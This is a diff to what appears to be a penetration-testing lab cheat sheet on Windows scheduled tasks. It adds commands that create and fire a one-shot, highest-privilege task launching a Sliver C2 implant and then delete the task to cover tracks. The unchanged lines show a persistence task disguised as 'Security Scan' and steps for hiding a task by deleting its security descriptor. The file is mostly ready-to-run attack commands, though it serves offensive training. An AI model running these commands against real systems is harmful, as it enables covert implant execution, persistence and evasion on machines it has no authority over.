@@ -2,6 +2,23 @@
 
 ### Schtasks Quick Reference
 
+Dynamically schedule a task that will run one minute in the future, clean it up afterward
+
+```
+for /f "tokens=1-2 delims=:" %a in ("%time%") do schtasks /create /tn "OneShotTask" /tr "C:\Users\htb-student\Desktop\sliver.exe" /sc ONCE /st %a:%b /rl HIGHEST /f
+schtasks /delete /tn "OneShotTask" /f
+```
+
+Generate a schtask that will run once (to launch a sliver), remove it after you get your callback&#x20;
+
+```
+schtasks /create /tn "OneShotTask" /tr "C:\Users\htb-student\Desktop\sliver.exe" /sc ONCE /st 23:59 /rl HIGHEST /f
+# fire it immediately (dont wait for the time)
+schtasks /run /tn "OneShotTask"
+# clean up the task 
+schtasks /delete /tn "OneShotTask" /f
+```
+
 ```
 #normal task 15 minutes 
 SCHTASKS /create /sc minute /mo 15 /tn "Security Scan" /tr "C:\Windows\System32\spool\drivers\color\patch.exe" 
@@ -48,7 +65,10 @@ c:\tools\pstools\PsExec64.exe -s -i regedit
 * We will then delete the security descriptor for our task:
 *
 
-    <figure><img src="https://user-images.githubusercontent.com/75596877/181060133-34619dcd-33be-40f5-aa62-2fead6f2b4de.png" alt=""><figcaption></figcaption></figure>
+```
+<figure><img src="https://user-images.githubusercontent.com/75596877/181060133-34619dcd-33be-40f5-aa62-2fead6f2b4de.png" alt=""><figcaption></figcaption></figure>
+```
+
 * If we try to query our service again, the system will tell us there is no such task:
 
 ```
